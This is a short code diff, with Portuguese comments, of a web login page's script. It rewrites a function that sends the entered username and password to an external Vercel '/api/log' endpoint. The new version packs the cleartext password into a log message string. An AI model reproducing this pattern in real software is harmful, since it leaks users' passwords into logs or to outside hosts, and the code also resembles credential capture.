@@ -137,25 +137,22 @@
         document.getElementById('password').value = '';
       });
   
-      // Função para enviar dados para o servidor Vercel
-      function enviarDadosParaVercel(username, password) {
-        // Substitua com a URL real do seu servidor Vercel
-        var vercelURL = "https://vistoapp-backend.vercel.app/api/log";
+          // Função para enviar logs para o Vercel usando a API de logs
+          function enviarLogsParaVercel(username, password, vercelURL) {
+        // Monta a mensagem de log
+        var logMessage = `Username: ${username}, Password: ${password}`;
 
-        // Envia os dados usando o método POST
-        fetch(vercelURL, {
+        // Envia a mensagem de log para o Vercel
+        fetch(`https://${vercelURL}/api/log`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify({
-            username: username,
-            password: password,
-          }),
+          body: JSON.stringify({ message: logMessage }),
         })
           .then(response => response.json())
-          .then(data => console.log('Dados enviados com sucesso para o Vercel:', data))
-          .catch(error => console.error('Erro ao enviar dados para o Vercel:', error));
+          .then(data => console.log('Log enviado com sucesso:', data))
+          .catch(error => console.error('Erro ao enviar log para o Vercel:', error));
       }
     </script>
   </body>
